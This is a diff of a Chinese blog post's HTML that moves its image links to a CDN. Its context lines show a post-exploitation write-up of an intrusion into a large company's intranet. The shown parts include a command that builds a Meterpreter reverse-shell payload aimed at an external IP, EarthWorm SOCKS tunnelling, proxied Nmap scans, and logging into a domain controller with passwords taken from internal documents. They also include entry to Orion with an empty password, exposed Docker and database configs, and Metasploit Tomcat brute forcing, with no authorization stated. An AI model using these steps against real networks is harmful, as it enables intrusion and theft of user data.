@@ -250,7 +250,10 @@ Windows IP 配置
  
 </code></pre><p>这个内网地址我就不脱敏了，方便读者阅读后面的操作</p>
 <h2 id="0x02-后渗透的开始">0x02 后渗透的开始</h2>
-<p><img src="../../../static/images/ef156158-4f5e-11ec-9ba8-00d861bf4abb.png" alt="0x01"></p>
+<p><p class="md__image">
+    
+    <img src="https://cdn.jsdelivr.net/gh/Rvn0xsy/rvn0xsy.github.io/static/images/ef156158-4f5e-11ec-9ba8-00d861bf4abb.png" alt="0x01"  />
+  </p></p>
 <p>网络拓扑图如上</p>
 <p>首先我要生成一个MSF木马，目标由于是Win 2008支持<code>Powershell</code>，可以直接一句话搞定 :)</p>
 <p><code>./ps1encode.rb -i 外网IP -p 1131 -a windows/x64/meterpreter/reverse_tcp </code></p>
@@ -792,8 +795,14 @@ finishTime    : 2017/12/28 17:23:45
 <p>ew下载地址： <a href="http://rootkiter.com/EarthWorm/">http://rootkiter.com/EarthWorm/</a></p>
 </blockquote>
 <p>现在在浏览器中设置一下Socks5代理即可访问内网，很稳定</p>
-<p><img src="../../../static/images/ef9995b8-4f5e-11ec-9e7b-00d861bf4abb.png" alt="设置代理"></p>
-<p><img src="../../../static/images/ef54dd42-4f5e-11ec-84cd-00d861bf4abb.png" alt="打洞成功"></p>
+<p><p class="md__image">
+    
+    <img src="https://cdn.jsdelivr.net/gh/Rvn0xsy/rvn0xsy.github.io/static/images/ef9995b8-4f5e-11ec-9e7b-00d861bf4abb.png" alt="设置代理"  />
+  </p></p>
+<p><p class="md__image">
+    
+    <img src="https://cdn.jsdelivr.net/gh/Rvn0xsy/rvn0xsy.github.io/static/images/ef54dd42-4f5e-11ec-84cd-00d861bf4abb.png" alt="打洞成功"  />
+  </p></p>
 <h2 id="0x08-开始扫描">0x08 开始扫描</h2>
 <p>一开始我使用PowerSploit扫描，但是需要等待Meterpreter将数据取回，这样就占用了一个session，搜集了部分信息后，决定采用Nmap</p>
 <p>由于我的操作系统是黑苹果，需要安装proxychains-ng</p>
@@ -813,16 +822,31 @@ finishTime    : 2017/12/28 17:23:45
 # defaults set to &#34;tor&#34;
 socks5  ***.***.***.*** 1080
 </code></pre><p>开始扫描：</p>
-<p><img src="../../../static/images/f01e8b7e-4f5e-11ec-a1d4-00d861bf4abb.png" alt="扫描"></p>
+<p><p class="md__image">
+    
+    <img src="https://cdn.jsdelivr.net/gh/Rvn0xsy/rvn0xsy.github.io/static/images/f01e8b7e-4f5e-11ec-a1d4-00d861bf4abb.png" alt="扫描"  />
+  </p></p>
 <h2 id="0x09-信息搜集基本结果">0x09 信息搜集基本结果</h2>
 <p>通过端口扫描以及HTTP服务的爬行，发现一些运维人员开放的共享，和一些MS17010漏洞的Windows服务器，但是没有选择直接去打，觉得信息搜集的不够全面</p>
 <p>在内网中收获最大的就是搜集到了运维人员用于共享系统镜像、工具的Web服务器：</p>
-<p><img src="../../../static/images/f05f8aca-4f5e-11ec-ba8f-00d861bf4abb.png" alt="运维人员的服务器"></p>
+<p><p class="md__image">
+    
+    <img src="https://cdn.jsdelivr.net/gh/Rvn0xsy/rvn0xsy.github.io/static/images/f05f8aca-4f5e-11ec-ba8f-00d861bf4abb.png" alt="运维人员的服务器"  />
+  </p></p>
 <p>发现基线检查的文档，下载了一两个，开始通过搜集的信息进行内网结构画像：</p>
-<p><img src="../../../static/images/f0e9cf46-4f5e-11ec-8881-00d861bf4abb.png" alt="基线检查"></p>
-<p><img src="../../../static/images/f0aa9f42-4f5e-11ec-8568-00d861bf4abb.png" alt="内网结构"></p>
+<p><p class="md__image">
+    
+    <img src="https://cdn.jsdelivr.net/gh/Rvn0xsy/rvn0xsy.github.io/static/images/f0e9cf46-4f5e-11ec-8881-00d861bf4abb.png" alt="基线检查"  />
+  </p></p>
+<p><p class="md__image">
+    
+    <img src="https://cdn.jsdelivr.net/gh/Rvn0xsy/rvn0xsy.github.io/static/images/f0aa9f42-4f5e-11ec-8568-00d861bf4abb.png" alt="内网结构"  />
+  </p></p>
 <h3 id="轻松获得域控服务器">轻松获得域控服务器</h3>
-<p><img src="../../../static/images/f12dd0c4-4f5e-11ec-8057-00d861bf4abb.png" alt="域控"></p>
+<p><p class="md__image">
+    
+    <img src="https://cdn.jsdelivr.net/gh/Rvn0xsy/rvn0xsy.github.io/static/images/f12dd0c4-4f5e-11ec-8057-00d861bf4abb.png" alt="域控"  />
+  </p></p>
 <p>从文档中搜集信息如下：</p>
 <pre tabindex="0"><code>密码：*****@*****! *****
 
@@ -852,20 +876,32 @@ IP地址1：10.159.16.4
 IP地址2：192.168.10.4
 操作系统：Windows Server 2012
 </code></pre><p>根据之前搜集的子网来判断，我们所处于的内网中有很多域。并且能够可以和域控服务器通信，即使当前的服务器不在域中，也可以进行登录</p>
-<p><img src="../../../static/images/f16d5668-4f5e-11ec-951e-00d861bf4abb.png" alt="域控3389"></p>
+<p><p class="md__image">
+    
+    <img src="https://cdn.jsdelivr.net/gh/Rvn0xsy/rvn0xsy.github.io/static/images/f16d5668-4f5e-11ec-951e-00d861bf4abb.png" alt="域控3389"  />
+  </p></p>
 <p>通过两层转发，我们尝试登录：</p>
 <ul>
 <li>一层是公司路由</li>
 <li>一层是LCX</li>
 </ul>
-<p><img src="../../../static/images/f1afeaaa-4f5e-11ec-a78a-00d861bf4abb.jpg" alt="登录域控"></p>
+<p><p class="md__image">
+    
+    <img src="https://cdn.jsdelivr.net/gh/Rvn0xsy/rvn0xsy.github.io/static/images/f1afeaaa-4f5e-11ec-a78a-00d861bf4abb.jpg" alt="登录域控"  />
+  </p></p>
 <p>当时登录上去并没有做过多的操作，简单看看就下来了，因为这个内网很大，后面的发现令我倒吸凉气</p>
 <h2 id="0x10-内网核心">0x10 内网核心</h2>
 <p>Orion</p>
 <p>这是一款完善的网络带宽、性能和故障管理软件。使用它用户可以通过自己的浏览器即时监控自己的网络状态和统计资料。程序将监视和搜集来自路由、节点、服务器和所有开启SNMP服务的设备信息；同时也将监控本机的CPU占用率、内存使用情况以及可用磁盘空间。</p>
-<p><img src="../../../static/images/f1f70944-4f5e-11ec-9f5d-00d861bf4abb.png" alt="Orion"></p>
+<p><p class="md__image">
+    
+    <img src="https://cdn.jsdelivr.net/gh/Rvn0xsy/rvn0xsy.github.io/static/images/f1f70944-4f5e-11ec-9f5d-00d861bf4abb.png" alt="Orion"  />
+  </p></p>
 <p>通过空口令进入</p>
-<p><img src="../../../static/images/f231d7fe-4f5e-11ec-bb53-00d861bf4abb.png" alt="Orion"></p>
+<p><p class="md__image">
+    
+    <img src="https://cdn.jsdelivr.net/gh/Rvn0xsy/rvn0xsy.github.io/static/images/f231d7fe-4f5e-11ec-bb53-00d861bf4abb.png" alt="Orion"  />
+  </p></p>
 <p>通过查看别名发现这些设备是企业的核心路由、防火墙、交换机</p>
 <ul>
 <li>官网防火墙</li>
@@ -886,13 +922,25 @@ IP地址2：192.168.10.4
 [*] AutoAddRoute: Routing new subnet 192.168.0.0/255.255.0.0 through session 9
 </code></pre><p>10.0.0.0 是可以访问整个超大的内网，在搜集其他网段信息的时候，不泛发现其他大企业的漏洞、大多是配置不得当。</p>
 <h2 id="0x12-配置引发的隐患">0x12 配置引发的隐患</h2>
-<p><img src="../../../static/images/f27348c4-4f5e-11ec-b671-00d861bf4abb.png" alt="一些配置文件"></p>
-<p><img src="../../../static/images/f2b2c738-4f5e-11ec-a432-00d861bf4abb.png" alt="一些配置文件"></p>
+<p><p class="md__image">
+    
+    <img src="https://cdn.jsdelivr.net/gh/Rvn0xsy/rvn0xsy.github.io/static/images/f27348c4-4f5e-11ec-b671-00d861bf4abb.png" alt="一些配置文件"  />
+  </p></p>
+<p><p class="md__image">
+    
+    <img src="https://cdn.jsdelivr.net/gh/Rvn0xsy/rvn0xsy.github.io/static/images/f2b2c738-4f5e-11ec-a432-00d861bf4abb.png" alt="一些配置文件"  />
+  </p></p>
 <p>还有未做权限验证的Docker集群管理平台：</p>
-<p><img src="../../../static/images/f2f5c5ce-4f5e-11ec-8b1d-00d861bf4abb.png" alt="Docker"></p>
+<p><p class="md__image">
+    
+    <img src="https://cdn.jsdelivr.net/gh/Rvn0xsy/rvn0xsy.github.io/static/images/f2f5c5ce-4f5e-11ec-8b1d-00d861bf4abb.png" alt="Docker"  />
+  </p></p>
 <p>有多个实例，分别用于对外的服务</p>
 <p>搜集到用户中心的数据库配置，也就是说泄漏了所有用户的数据了，这可是一个大厂。</p>
-<p><img src="../../../static/images/f33d9e9e-4f5e-11ec-9a04-00d861bf4abb.png" alt="数据库"></p>
+<p><p class="md__image">
+    
+    <img src="https://cdn.jsdelivr.net/gh/Rvn0xsy/rvn0xsy.github.io/static/images/f33d9e9e-4f5e-11ec-9a04-00d861bf4abb.png" alt="数据库"  />
+  </p></p>
 <p>其次一些网段基本上都安装了<code>tomcat</code>，通过socks5代理，进行爆破，流量不走Meterpreter，因为会掉线</p>
 <pre tabindex="0"><code>msf auxiliary(tomcat_mgr_login) &gt; show options 
 
@@ -920,7 +968,10 @@ Module options (auxiliary/scanner/http/tomcat_mgr_login):
    USER_FILE         /opt/metasploit-framework/embedded/framework/data/wordlists/tomcat_mgr_default_users.txt     no        File containing users, one per line
    VERBOSE           true                                                                                         yes       Whether to print output for all attempts
    VHOST                                                                                                          no        HTTP server virtual host
-</code></pre><p><img src="../../../static/images/f3aefeea-4f5e-11ec-b44a-00d861bf4abb.png" alt="tomcat爆破"></p>
+</code></pre><p><p class="md__image">
+    
+    <img src="https://cdn.jsdelivr.net/gh/Rvn0xsy/rvn0xsy.github.io/static/images/f3aefeea-4f5e-11ec-b44a-00d861bf4abb.png" alt="tomcat爆破"  />
+  </p></p>
 <p>如我所料，没有一个成功的，也发现了一些SSH端口，但是会把流量升高，触发一些警报，就没有再尝试这种爆破手法了。</p>
 <h2 id="0x13-需要搜集的信息">0x13 需要搜集的信息</h2>
 <p>搜集的信息列出来，就不贴了：</p>
